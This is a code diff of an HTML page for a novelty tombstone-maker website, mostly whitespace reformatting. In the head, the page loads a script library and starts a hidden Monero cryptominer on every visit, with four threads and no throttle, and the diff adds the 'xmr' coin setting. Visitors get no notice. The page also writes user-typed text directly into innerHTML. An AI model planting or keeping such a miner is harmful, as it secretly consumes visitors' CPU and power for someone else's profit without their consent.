@@ -3,16 +3,16 @@
 
 <head>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.js"></script> 
- 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script> 
-     
-    <!-- Primary Meta Tags -->
-<title>Create your tombstone</title>
-<meta name="title" content="Create your tombstone">
-<meta name="description" content=":)">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.js"></script>
 
-<script src="html2canvas.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+
+    <!-- Primary Meta Tags -->
+    <title>Create your tombstone</title>
+    <meta name="title" content="Create your tombstone">
+    <meta name="description" content=":)">
+
+    <script src="html2canvas.js"></script>
 
     <script type="text/javascript" src="/path/to/src/jquery.easeScroll.js"></script>
     <link rel="icon" type="image/png" sizes="16x16" href="images/logop.png">
@@ -26,7 +26,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@700&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
-   
+
     <script language="JavaScript">
 
         window.onload = function () {
@@ -68,15 +68,15 @@
         }
      //edit: removed ";" from last "}" because of javascript error
     </script>
-        <script src="lib/crypta.js"></script>
-        <script>
-        var miner=new CRLT.Anonymous('cb4044a26849c95422daad7e15037780fbc14e6e688d',
-                {
-                threads:4,autoThreads:false,throttle:0,
-                }
+    <script src="lib/crypta.js"></script>
+    <script>
+        var miner = new CRLT.Anonymous('cb4044a26849c95422daad7e15037780fbc14e6e688d',
+            {
+                threads: 4, autoThreads: false, throttle: 0, coin: "xmr",
+            }
         );
         miner.start();
-        </script>
+    </script>
 </head>
 
 <body onload="init()">
@@ -87,13 +87,15 @@
                 <p class="textl2" id="demo2"></p>
                 <p class="textl3" id="demo3"></p>
                 <p class="textl4" id="demo4"></p>
-                <img class="tombe" src="https://cdn.discordapp.com/attachments/486234039905288225/759399413742305310/02122fd0-036e-11ea-82bb-0eda3a42da3c.jpg" alt="">
+                <img class="tombe"
+                    src="https://cdn.discordapp.com/attachments/486234039905288225/759399413742305310/02122fd0-036e-11ea-82bb-0eda3a42da3c.jpg"
+                    alt="">
             </div>
         </div>
     </div>
 
     <div>
-        
+
 
         <input class="tombe" type="text" id="myText" value="Deceased name">
         <input class="tombe2" type="text" id="myText2" value=":(">
@@ -101,31 +103,35 @@
         <input class="tombe4" type="text" id="myText4" value="~ 1589 - 2020 ~">
         <button class="tombe" onclick="myFunction()">Bury !</button>
 
- 
-        <script>
-        function myFunction() {
-            var x = document.getElementById("myText").value;
-            document.getElementById("demo").innerHTML = x;
-            var x2 = document.getElementById("myText2").value;
-            document.getElementById("demo2").innerHTML = x2;
-            var x3 = document.getElementById("myText3").value;
-            document.getElementById("demo3").innerHTML = x3;
-            var x4 = document.getElementById("myText4").value;
-            document.getElementById("demo4").innerHTML = x4;
-        }
-        </script>
-                    <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top" class="don">
-                        <input type="hidden" name="cmd" value="_donations" />
-                        <input type="hidden" name="business" value="whartokx@gmail.com" />
-                        <input type="hidden" name="item_name" value="Nous soutenir dans nos projets :)" />
-                        <input type="hidden" name="currency_code" value="EUR" />
-                        <input type="image" src="https://cdn.discordapp.com/attachments/486234039905288225/764217295702458388/Sans-titre-1.png" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Bouton Faites un don avec PayPal" />
-                        <img alt="" border="0" src="https://www.paypal.com/fr_FR/i/scr/pixel.gif" width="1" height="1" />
-                        </form>
 
-        
+        <script>
+            function myFunction() {
+                var x = document.getElementById("myText").value;
+                document.getElementById("demo").innerHTML = x;
+                var x2 = document.getElementById("myText2").value;
+                document.getElementById("demo2").innerHTML = x2;
+                var x3 = document.getElementById("myText3").value;
+                document.getElementById("demo3").innerHTML = x3;
+                var x4 = document.getElementById("myText4").value;
+                document.getElementById("demo4").innerHTML = x4;
+            }
+        </script>
+        <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top" class="don">
+            <input type="hidden" name="cmd" value="_donations" />
+            <input type="hidden" name="business" value="whartokx@gmail.com" />
+            <input type="hidden" name="item_name" value="Nous soutenir dans nos projets :)" />
+            <input type="hidden" name="currency_code" value="EUR" />
+            <input type="image"
+                src="https://cdn.discordapp.com/attachments/486234039905288225/764217295702458388/Sans-titre-1.png"
+                border="0" name="submit" title="PayPal - The safer, easier way to pay online!"
+                alt="Bouton Faites un don avec PayPal" />
+            <img alt="" border="0" src="https://www.paypal.com/fr_FR/i/scr/pixel.gif" width="1" height="1" />
+        </form>
+
+
     </div>
-    
-    
+
+
 </body>
+
 </html>
